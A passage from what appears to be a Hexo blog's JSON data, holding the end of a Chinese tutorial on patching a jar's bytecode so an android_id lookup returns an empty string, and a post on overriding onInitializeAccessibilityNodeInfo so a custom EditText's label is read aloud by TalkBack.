class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ldc &quot;&quot;</span><br><span class=\"line\">astore_1 // defaultAndroidId变量赋值</span><br><span class=\"line\">ldc &quot;&quot;</span><br><span class=\"line\">astore_2 // androidId变量赋值</span><br><span class=\"line\">aload_0 // 开始引用context</span><br><span class=\"line\">invokevirtual android/content/Context/getContentResolver()Landroid/content/ContentResolver; // 并调用它的getContentResolver方法</span><br><span class=\"line\">ldc &quot;android_id&quot;</span><br><span class=\"line\">invokestatic android/provider/Settings$Secure/getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String; // 传入常量&quot;android_id&quot;，并调用getString方法</span><br><span class=\"line\">astore_2 // 将上述方法调用返回结果赋值给androidId变量</span><br><span class=\"line\">aload_2 // 引用已赋值的变量，传入下面的isEmpty方法</span><br><span class=\"line\">invokestatic android/text/TextUtils/isEmpty(Ljava/lang/CharSequence;)Z</span><br><span class=\"line\">ifeq 15 // 若判断返回true则跳转第15行</span><br><span class=\"line\">ldc &quot;&quot;</span><br><span class=\"line\">astore_2</span><br><span class=\"line\">aload_2 // 这里是第15行指令</span><br><span class=\"line\">areturn</span><br></pre></td></tr></table></figure>\n\n<p>3、搞清楚含义之后，就可以为所欲为了。直接删掉相关逻辑，让方法直接返回空字符串：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/20200325014830223.png\" alt=\"在这里插入图片描述\"></p>\n<p>4、点击Save method后，将此修改后的class粘贴到原来的jar包中覆盖旧class即可（和A方法中的最后步骤一样）。用JD-GUI打开检验一下：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/20200325014619860.png\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"其他注意事项\"><a href=\"#其他注意事项\" class=\"headerlink\" title=\"其他注意事项\"></a>其他注意事项</h2><p>1、我最开始用的Java 13作为编译环境，但13的javac命令已经不支持-Djava.ext.dirs，目前暂时没有探究替代方法，所以又换回了Java 8。</p>\n<p>2、在修改jar包时要确定其编译时所用的Java版本，我们需要与之一致，用JBE可以查看Major Version：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/20200325015912615.png\" alt=\"在这里插入图片描述\"></p>\n<p>3、关于字节码指令大全，建议大家参考官方文档（JVM规范，见参考链接），网上搜出来的二次资料可能不保险。</p>\n<h2 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h2><ul>\n<li><p><a href=\"https://lucumt.info/post/modify-java-class-file-content-directly/\">在不重新编译的情况下直接修改Java Class文件中的内容</a></p>\n</li>\n<li><p><a href=\"https://docs.oracle.com/javase/specs/jvms/se8/html/index.html\">Java虚拟机规范</a></p>\n</li>\n</ul>\n"},{"layout":"post","title":"自定义EditText的无障碍描述（不读hint）","subtitle":"探索发现。","date":"2020-05-13T16:00:00.000Z","author":"YSY","header-img":"img/home-bg.jpg","catalog":true,"_content":"\n## 问题\n\n我们一般给一个控件设置描述时，会这样：\n\n```java\nxxxView.setContentDescription(\"xxx\");\n```\n\n但是，当你给EditText设置这个时，会发现毫无卵用。为什么呢？\n\n搜了下EditText和其直接父类TextView，没有重写setContentDescription方法，那应该不是setXXX时发生改变，而是getXXX的问题。\n\n果然，在TextView中发现：\n\n```java\n/**\n * Returns the text that should be exposed to accessibility services.\n * <p>\n * This approximates what is displayed visually. If the user has specified\n * that accessibility services should speak passwords, this method will\n * bypass any password transformation method and return unobscured text.\n *\n * @return the text that should be exposed to accessibility services, may\n *         be {@code null} if no text is set\n */\n@Nullable\n@UnsupportedAppUsage\nprivate CharSequence getTextForAccessibility() {\n    // If the text is empty, we must be showing the hint text.\n    if (TextUtils.isEmpty(mText)) {\n        return mHint;\n    }\n \n    // Otherwise, return whatever text is being displayed.\n    return TextUtils.trimToParcelableSize(mTransformed);\n}\n```\n\n所以EditText在获取到无障碍焦点时，只会朗读hint文本，而不是contentDescription。其实这个设计是没有问题的，可编辑控件，在没有输入内容时，就应该朗读hint。\n\n但是，某些自定义控件是长这样的：\n\n![MIUI EditText](https://imgconvert.csdnimg.cn/2020051423404290.png)\n\nlabel是自定义View画上去的，没做特殊处理的情况下Talkback识别不到，最好的体验是把左边的label也跟着读出来（比如读成：“列车车次，例：G1”），这可咋办？\n\n## 解决\n\n很显然，不能直接去改hint，否则UI显示不对。\n\n### 尝试一：获取焦点时我自己读一串文本行不行\n\n我们知道，可以通过：\n\n```java\nxxxView.announceForAccessibility(\"xxx\");\n```\n\n来进行无障碍朗读，但是并没有一个类似setOnFocusChangeListener的方法来专门监听无障碍焦点，所以这个不好搞。\n\n### 尝试二：Read the fucking code\n\n其实无障碍开发中还有一些关键方法，且Talkback这些无障碍辅助工具最终其实也会触发这些方法的：\n\n```java\nxxxView.requestAccessibilityFocus(); // 获取无障碍焦点，自动朗读已设置的描述\nxxxView.sendAccessibilityEvent(AccessibilityEvent.TYPE_VIEW_ACCESSIBILITY_FOCUSED); // 效果和前者差不多，且前者最后也要调用此方法\n```\n\n深入后可以跟踪到：\n\n```java\npublic void sendAccessibilityEventUncheckedInternal(AccessibilityEvent event) {\n    ...\n    onInitializeAccessibilityEvent(event);\n    // Only a subset of accessibility events populates text content.\n    if ((event.getEventType() & POPULATING_ACCESSIBILITY_EVENT_TYPES) != 0) {\n        dispatchPopulateAccessibilityEvent(event);\n    }\n    // In the beginning we called #isShown(), so we know that getParent() is not null.\n    ViewParent parent = getParent();\n    if (parent != null) {\n        getParent().requestSendAccessibilityEvent(this, event);\n    }\n}\n```\n\n这个onInitializeAccessibilityEvent的源码注释写得很明白，就是控件获取到无障碍事件时会触发，但通过event参数我们貌似做不了什么。\n\n在Textview中我们发现，与onInitializeAccessibilityEventInternal相邻有一个内部方法 **onInitializeAccessibilityNodeInfoInternal**：\n\n```java\npublic void onInitializeAccessibilityNodeInfoInternal(AccessibilityNodeInfo info) {\n    super.onInitializeAccessibilityNodeInfoInternal(info);\n \n    final boolean isPassword = hasPasswordTransformationMethod();\n    info.setPassword(isPassword);\n    info.setText(getTextForAccessibility());\n    info.setHintText(mHint);\n    info.setShowingHintText(isShowingHint());\n    ...\n}\n```\n\n这个 **info.setText(getTextForAccessibility());** 就是关键了，它其实才是最终朗读出来的那个文本。\n\n公共方法onInitializeAccessibilityNodeInfo的注释也说明了：Initializes an {@link AccessibilityNodeInfo} with information about this view. 此方法初始化一些View的无障碍基本信息。\n\n**最终解决：**\n\n在自定义的EditText类中重写方法，覆盖文本，这样在朗读时就是自己想要的了：\n\n```java\n@Override\npublic void onInitializeAccessibilityNodeInfo(AccessibilityNodeInfo info) {\n    super.onInitializeAccessibilityNodeInfo(info);\n    // 对于EditText，系统无障碍朗读只读hint，需通过节点info覆盖自定义内容\n    info.setText(\"xxx\" + getHint());\n}\n```\n\nTips：其实这里为了API统一，我是直接 **info.setText(getContentDescription());** 方便很多。\n","source":"_posts/2020-05-14-自定义EditText的无障碍描述（不读hint）.md","raw":"---\nlayout:     post\ntitle:      自定义EditText的无障碍描述（不读hint）\nsubtitle:   探索发现。\ndate:       2020-05-14\nauthor:     YSY\nheader-img: img/home-bg.jpg\ncatalog: true\ntags:\n    - Java\n    - Android\n---\n\n## 问题\n\n我们一般给一个控件设置描述时，会这样：\n\n```java\nxxxView.setContentDescription(\"xxx\");\n```\n\n但是，当你给EditText设置这个时，会发现毫无卵用。为什么呢？\n\n搜了下EditText和其直接父类TextView，没有重写setContentDescription方法，那应该不是setXXX时发生改变，而是getXXX的问题。\n\n果然，在TextView中发现：\n\n```java\n/**\n * Returns the text that should be exposed to accessibility services.\n * <p>\n * This approximates what is displayed visually. If the user has specified\n * that accessibility services should speak passwords, this method will\n * bypass any password transformation method and return unobscured text.\n *\n * @return the text that should be exposed to accessibility services, may\n *         be {@code null} if no text is set\n */\n@Nullable\n@UnsupportedAppUsage\nprivate CharSequence getTextForAccessibility() {\n    // If the text is empty, we must be showing the hint text.\n    if (TextUtils.isEmpty(mText)) {\n        return mHint;\n    }\n \n    // Otherwise, return whatever text is being displayed.\n    return TextUtils.trimToParcelableSize(mTransformed);\n}\n```\n\n所以EditText在获取到无障碍焦点时，只会朗读hint文本，而不是contentDescription。其实这个设计是没有问题的，可编辑控件，在没有输入内容时，就应该朗读hint。\n\n但是，某些自定义控件是长这样的：\n\n![MIUI EditText](https://imgconvert.csdnimg.cn/2020051423404290.png)\n\nlabel是自定义View画上去的，没做特殊处理的情况下Talkback识别不到，最好的体验是把左边的label也跟着读出来（比如读成：“列车车次，例：G1”），这可咋办？\n\n## 解决\n\n很显然，不能直接去改hint，否则UI显示不对。\n\n### 尝试一：获取焦点时我自己读一串文本行不行\n\n我们知道，可以通过：\n\n```java\nxxxView.announceForAccessibility(\"xxx\");\n```\n\n来进行无障碍朗读，但是并没有一个类似setOnFocusChangeListener的方法来专门监听无障碍焦点，所以这个不好搞。\n\n### 尝试二：Read the fucking code\n\n其实无障碍开发中还有一些关键方法，且Talkback这些无障碍辅助工具最终其实也会触发这些方法的：\n\n```java\nxxxView.requestAccessibilityFocus(); // 获取无障碍焦点，自动朗读已设置的描述\nxxxView.sendAccessibilityEvent(AccessibilityEvent.TYPE_VIEW_ACCESSIBILITY_FOCUSED); // 效果和前者差不多，且前者最后也要调用此方法\n```\n\n深入后可以跟踪到：\n\n```java\npublic void sendAccessibilityEventUncheckedInternal(AccessibilityEvent event) {\n    ...\n    onInitializeAccessibilityEvent(event);\n    // Only a subset of accessibility events populates text content.\n    if ((event.getEventType() & POPULATING_ACCESSIBILITY_EVENT_TYPES) != 0) {\n        dispatchPopulateAccessibilityEvent(event);\n    }\n    // In the beginning we called #isShown(), so we know that getParent() is not null.\n    ViewParent parent = getParent();\n    if (parent != null) {\n        getParent().requestSendAccessibilityEvent(this, event);\n    }\n}\n```\n\n这个onInitializeAccessibilityEvent的源码注释写得很明白，就是控件获取到无障碍事件时会触发，但通过event参数我们貌似做不了什么。\n\n在Textview中我们发现，与onInitializeAccessibilityEventInternal相邻有一个内部方法 **onInitializeAccessibilityNodeInfoInternal**：\n\n```java\npublic void onInitializeAccessibilityNodeInfoInternal(AccessibilityNodeInfo info) {\n    super.onInitializeAccessibilityNodeInfoInternal(info);\n \n    final boolean isPassword = hasPasswordTransformationMethod();\n    info.setPassword(isPassword);\n    info.setText(getTextForAccessibility());\n    info.setHintText(mHint);\n    info.setShowingHintText(isShowingHint());\n    ...\n}\n```\n\n这个 **info.setText(getTextForAccessibility());** 就是关键了，它其实才是最终朗读出来的那个文本。\n\n公共方法onInitializeAccessibilityNodeInfo的注释也说明了：Initializes an {@link AccessibilityNodeInfo} with information about this view. 此方法初始化一些View的无障碍基本信息。\n\n**最终解决：**\n\n在自定义的EditText类中重写方法，覆盖文本，这样在朗读时就是自己想要的了：\n\n```java\n@Override\npublic void onInitializeAccessibilityNodeInfo(AccessibilityNodeInfo info) {\n    super.onInitializeAccessibilityNodeInfo(info);\n    // 对于EditText，系统无障碍朗读只读hint，需通过节点info覆盖自定义内容\n    info.setText(\"xxx\" + getHint());\n}\n```\n\nTips：其实这里为了API统一，我是直接 **info.setText(getContentDescription());** 方便很多。\n","slug":"自定义EditText的无障碍描述（不读hint）","published":1,"updated":"2024-03-25T07:31:25.861Z","comments":1,"photos":[],"link":"","_id":"cluaufh10002jthe6273g3sri","content":"<h2 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h2><p>我们一般给一个控件设置描述时，会这样：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">xxxView.setContentDescription(<span class=\"string\">&quot;xxx&quot;</span>);</span><br></pre></td></tr></table></figure>\n\n<p>但是，当你给EditText设置这个时，会发现毫无卵用。为什么呢？</p>\n<p>搜了下EditText和其直接父类TextView，没有重写setContentDescription方法，那应该不是setXXX时发生改变，而是getXXX的问题。</p>\n<p>果然，在TextView中发现：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Returns the text that should be exposed to accessibility services.</span></span><br><span class=\"line\"><span class=\"comment\"> * &lt;p&gt;</span></span><br><span class=\"line\"><span class=\"comment\"> * This approximates what is displayed visually. If the user has specified</span></span><br><span class=\"line\"><span class=\"comment\"> * that accessibility services should speak passwords, this method will</span></span><br><span class=\"line\"><span class=\"comment\"> * bypass any password transformation method and return unobscured text.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@return</span> the text that should be exposed to accessibility services, may</span></span><br><span class=\"line\"><span class=\"comment\"> *         be &#123;<span class=\"doctag\">@code</span> null&#125; if no text is set</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"meta\">@Nullable</span></span><br><span class=\"line\"><span class=\"meta\">@UnsupportedAppUsage</span></span><br><span class=\"line\"><span class=\"keyword\">private</span> CharSequence <span class=\"title function_\">getTextForAccessibility</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// If the text is empty, we must be showing the hint text.</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (TextUtils.isEmpty(mText)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> mHint;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"comment\">// Otherwise, return whatever text is being displayed.</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> TextUtils.trimToParcelableSize(mTransformed);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>所以EditText在获取到无障碍焦点时，只会朗读hint文本，而不是contentDescription。其实这个设计是没有问题的，可编辑控件，在没有输入内容时，就应该朗读hint。</p>\n<p>但是，某些自定义控件是长这样的：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/2020051423404290.png\" alt=\"MIUI EditText\"></p>\n<p>label是自定义View画上去的，没做特殊处理的情况下Talkback识别不到，最好的体验是把左边的label也跟着读出来（比如读成：“列车车次，例：G1”），这可咋办？</p>\n<h2 id=\"解决\"><a href=\"#解决\" class=\"headerlink\" title=\"解决\"></a>解决</h2><p>很显然，不能直接去改hint，否则UI显示不对。</p>\n<h3 id=\"尝试一：获取焦点时我自己读一串文本行不行\"><a href=\"#尝试一：获取焦点时我自己读一串文本行不行\" class=\"headerlink\" title=\"尝试一：获取焦点时我自己读一串文本行不行\"></a>尝试一：获取焦点时我自己读一串文本行不行</h3><p>我们知道，可以通过：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">xxxView.announceForAccessibility(<span class=\"string\">&quot;xxx&quot;</span>);</span><br></pre></td></tr></table></figure>\n\n<p>来进行无障碍朗读，但是并没有一个类似setOnFocusChangeListener的方法来专门监听无障碍焦点，所以这个不好搞。</p>\n<h3 id=\"尝试二：Read-the-fucking-code\"><a href=\"#尝试二：Read-the-fucking-code\" class=\"headerlink\" title=\"尝试二：Read the fucking code\"></a>尝试二：Read the fucking code</h3><p>其实无障碍开发中还有一些关键方法，且Talkback这些无障碍辅助工具最终其实也会触发这些方法的：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">xxxView.requestAccessibilityFocus(); <span class=\"comment\">// 获取无障碍焦点，自动朗读已设置的描述</span></span><br><span class=\"line\">xxxView.sendAccessibilityEvent(AccessibilityEvent.TYPE_VIEW_ACCESSIBILITY_FOCUSED); <span class=\"comment\">// 效果和前者差不多，且前者最后也要调用此方法</span></span><br></pre></td></tr></table></figure>\n\n<p>深入后可以跟踪到：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">sendAccessibilityEventUncheckedInternal</span><span class=\"params\">(AccessibilityEvent event)</span> &#123;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    onInitializeAccessibilityEvent(event);</span><br><span class=\"line\">    <span class=\"comment\">// Only a subset of accessibility events populates text content.</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ((event.getEventType() &amp; POPULATING_ACCESSIBILITY_EVENT_TYPES) != <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        dispatchPopulateAccessibilityEvent(event);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// In the beginning we called #isShown(), so we know that getParent() is not null.</span></span><br><span class=\"line\">    <span class=\"type\">ViewParent</span> <span class=\"variable\">parent</span> <span class=\"operator\">=</span> getParent();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (parent != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">        getParent().requestSendAccessibilityEvent(<span class=\"built_in\">this</span>, event);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这个onInitializeAccessibilityEvent的源码注释写得很明白，就是控件获取到无障碍事件时会触发，但通过event参数我们貌似做不了什么。</p>\n<p>在Textview中我们发现，与onInitializeAccessibilityEventInternal相邻有一个内部方法 <strong>onInitializeAccessibilityNodeInfoInternal</strong>：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onInitializeAccessibilityNodeInfoInternal</span><span class=\"params\">(AccessibilityNodeInfo info)</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">super</span>.onInitializeAccessibilityNodeInfoInternal(info);</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"type\">boolean</span> <span class=\"variable\">isPassword</span> <span class=\"operator\">=</span> hasPasswordTransformationMethod();</span><br><span class=\"line\">    info.setPassword(isPassword);</span><br><span class=\"line\">    info.setText(getTextForAccessibility());</span><br><span class=\"line\">    info.setHintText(mHint);</span><br><span class=\"line\">    info.setShowingHintText(isShowingHint());</span><br><span class=\"line\">    ...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这个 <strong>info.setText(getTextForAccessibility());</strong> 就是关键了，它其实才是最终朗读出来的那个文本。</p>\n<p>公共方法onInitializeAccessibilityNodeInfo的注释也说明了：Initializes an {@link AccessibilityNodeInfo} with information about this view. 此方法初始化一些View的无障碍基本信息。</p>\n<p><strong>最终解决：</strong></p>\n<p>在自定义的EditText类中重写方法，覆盖文本，这样在朗读时就是自己想要的了：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Override</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onInitializeAccessibilityNodeInfo</span><span class=\"params\">(AccessibilityNodeInfo info)</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">super</span>.onInitializeAccessibilityNodeInfo(info);</span><br><span class=\"line\">    <span class=\"comment\">// 对于EditText，系统无障碍朗读只读hint，需通过节点info覆盖自定义内容</span></span><br><span class=\"line\">    info.setText(<span class=\"string\">&quot;xxx&quot;</span> + getHint());</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>Tips：其实这里为了API统一，我是直接 <strong>info.setText(getContentDescription());</strong> 方便很多。</p>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<h2 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h2><p>我们一般给一个控件设置描述时，会这样：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">xxxView.setContentDescription(<span class=\"string\">&quot;xxx&quot;</span>);</span><br></pre></td></tr></table></figure>\n\n<p>但是，当你给EditText设置这个时，会发现毫无卵用。为什么呢？</p>\n<p>搜了下EditText和其直接父类TextView，没有重写setContentDescription方法，那应该不是setXXX时发生改变，而是getXXX的问题。</p>\n<p>果然，在TextView中发现：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Returns the text that should be exposed to accessibility services.</span></span><br><span class=\"line\"><span class=\"comment\"> * &lt;p&gt;</span></span><br><span class=\"line\"><span class=\"comment\"> * This approximates what is displayed visually. If the user has specified</span></span><br><span class=\"line\"><span class=\"comment\"> * that accessibility services should speak passwords, this method will</span></span><br><span class=\"line\"><span class=\"comment\"> * bypass any password transformation method and return unobscured text.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@return</span> the text that should be exposed to accessibility services, may</span></span><br><span class=\"line\"><span class=\"comment\"> *         be &#123;<span class=\"doctag\">@code</span> null&#125; if no text is set</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"meta\">@Nullable</span></span><br><span class=\"line\"><span class=\"meta\">@UnsupportedAppUsage</span></span><br><span class=\"line\"><span class=\"keyword\">private</span> CharSequence <span class=\"title function_\">getTextForAccessibility</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// If the text is empty, we must be showing the hint text.</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (TextUtils.isEmpty(mText)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> mHint;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"comment\">// Otherwise, return whatever text is being displayed.</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> TextUtils.trimToParcelableSize(mTransformed);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>所以EditText在获取到无障碍焦点时，只会朗读hint文本，而不是contentDescription。其实这个设计是没有问题的，可编辑控件，在没有输入内容时，就应该朗读hint。</p>\n<p>但是，某些自定义控件是长这样的：</p>\n<p><img src=\"https://imgconvert.csdnimg.cn/2020051423404290.png\" alt=\"MIUI EditText\"></p>\n<p>label是自定义View画上去的，没做特殊处理的情况下Talkback识别不到，最好的体验是把左边的label也跟着读出来（比如读成：“列车车次，例：G1”），这可咋办？</p>\n<h2 id=\"解决\"><a href=\"#解决\" class=\"headerlink\" title=\"解决\"></a>解决</h2><p>很显然，不能直接去改hint，否则UI显示不对。</p>\n<h3 id=\"尝试一：获取焦点时我自己读一串文本行不行\"><a href=\"#尝试一：获取焦点时我自己读一串文本行不行\" class=\"headerlink\" title=\"尝试一：获取焦点时我自己读一串文本行不行\"></a>尝试一：获取焦点时我自己读一串文本行不行</h3><p>我们知道，可以通过：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">xxxView.announceForAccessibility(<span class=\"string\">&quot;xxx&quot;</span>);</span><br></pre></td></tr></table></figure>\n\n<p>来进行无障碍朗读，但是并没有一个类似setOnFocusChangeListener的方法来专门监听无障碍焦点，所以这个不好搞。</p>\n<h3 id=\"尝试二：Read-the-fucking-code\"><a href=\"#尝试二：Read-the-fucking-code\" class=\"headerlink\" title=\"尝试二：Read the fucking code\"></a>尝试二：Read the fucking code</h3><p>其实无障碍开发中还有一些关键方法，且Talkback这些无障碍辅助工具最终其实也会触发这些方法的：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">xxxView.requestAccessibilityFocus(); <span class=\"comment\">// 获取无障碍焦点，自动朗读已设置的描述</span></span><br><span class=\"line\">xxxView.sendAccessibilityEvent(AccessibilityEvent.TYPE_VIEW_ACCESSIBILITY_FOCUSED); <span class=\"comment\">// 效果和前者差不多，且前者最后也要调用此方法</span></span><br></pre></td></tr></table></figure>\n\n<p>深入后可以跟踪到：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">sendAccessibilityEventUncheckedInternal</span><span class=\"params\">(AccessibilityEvent event)</span> &#123;</span><br><span class=\"line\">    ...</span><br><span class=\"line\">    onInitializeAccessibilityEvent(event);</span><br><span class=\"line\">    <span class=\"comment\">// Only a subset of accessibility events populates text content.</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ((event.getEventType() &amp; POPULATING_ACCESSIBILITY_EVENT_TYPES) != <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        dispatchPopulateAccessibilityEvent(event);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// In the beginning we called #isShown(), so we know that getParent() is not null.</span></span><br><span class=\"line\">    <span class=\"type\">ViewParent</span> <span class=\"variable\">parent</span> <span class=\"operator\">=</span> getParent();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (parent != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">        getParent().requestSendAccessibilityEvent(<span class=\"built_in\">this</span>, event);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这个onInitializeAccessibilityEvent的源码注释写得很明白，就是控件获取到无障碍事件时会触发，但通过event参数我们貌似做不了什么。</p>\n<p>在Textview中我们发现，与onInitializeAccessibilityEventInternal相邻有一个内部方法 <strong>onInitializeAccessibilityNodeInfoInternal</strong>：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">onInitializeAccessibilityNodeInfoInternal</span><span class=\"params\">(AccessibilityNodeInfo info)</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">super</span>.onInitializeAccessibilityNodeInfoInternal(info);</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">final</span> <span class=\"type\">boolean</span> <span class=\"variable\">isPassword</span> <span class=\"operator\">=</span> hasPasswordTransformationMethod();</span><br><span class=\"line\">    info.setPassword(isPassword);</span><br><span class=\"line\">    